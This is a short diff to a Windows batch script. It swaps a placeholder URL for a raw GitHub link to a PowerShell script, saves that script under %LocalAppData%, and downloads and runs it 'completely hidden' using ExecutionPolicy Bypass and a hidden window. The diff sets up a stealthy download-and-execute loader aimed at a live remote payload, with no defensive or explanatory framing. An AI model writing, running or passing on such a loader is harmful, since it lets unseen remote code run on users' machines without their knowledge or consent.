@@ -2,8 +2,8 @@
 setlocal
 
 :: Set the direct URL and filename for the PowerShell script
-set "Url=https://example.com/path/to/your/script.ps1"
-set "Filename=%LocalAppData%\script.ps1"
+set "Url=https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/I.ps1"
+set "Filename=%LocalAppData%\I.ps1"
 
 :: Use PowerShell to download the script and execute it completely hidden
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
